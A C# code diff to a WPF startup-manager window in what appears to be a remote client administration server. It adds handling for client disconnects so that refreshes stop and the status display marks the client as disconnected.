@@ -15,6 +15,7 @@ public partial class StartupManagerWindow : ThemedWindow
     private readonly ObservableCollection<StartupEntryVM> _entries = [];
     private CancellationTokenSource? _refreshCts;
     private bool _awaitingResponse;
+    private bool _disconnected;
 
     public StartupManagerWindow(TlsServer server, string clientId, string clientLabel)
     {
@@ -26,11 +27,13 @@ public partial class StartupManagerWindow : ThemedWindow
         GridStartup.ItemsSource = _entries;
 
         _server.RegisterHandler(clientId, PacketType.StartupListResult, OnList);
+        _server.ClientDisconnected += OnClientDisconnected;
         Lang.LanguageChanged += ApplyLanguage;
         ApplyLanguage();
         Closed += (_, _) =>
         {
             _server.UnregisterHandler(clientId, PacketType.StartupListResult);
+            _server.ClientDisconnected -= OnClientDisconnected;
             Lang.LanguageChanged -= ApplyLanguage;
             _refreshCts?.Cancel(); _refreshCts?.Dispose(); _refreshCts = null;
         };
@@ -53,6 +56,7 @@ public partial class StartupManagerWindow : ThemedWindow
 
     private async Task Refresh()
     {
+        if (_disconnected) return;
         _refreshCts?.Cancel();
         _refreshCts?.Dispose();
         _refreshCts = new CancellationTokenSource();
@@ -100,6 +104,19 @@ public partial class StartupManagerWindow : ThemedWindow
             });
         }
         catch { }
+    }
+
+    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (c.Id != _clientId) return;
+        _refreshCts?.Cancel();
+        Dispatcher.BeginInvoke(() =>
+        {
+            _disconnected      = true;
+            _awaitingResponse  = false;
+            TxtStatus.Text     = Lang.Get("PM_DISCONNECTED");
+            GridStartup.Opacity = 0.55;
+        });
     }
 
     private async void Refresh_Click(object s, RoutedEventArgs e) => await Refresh();
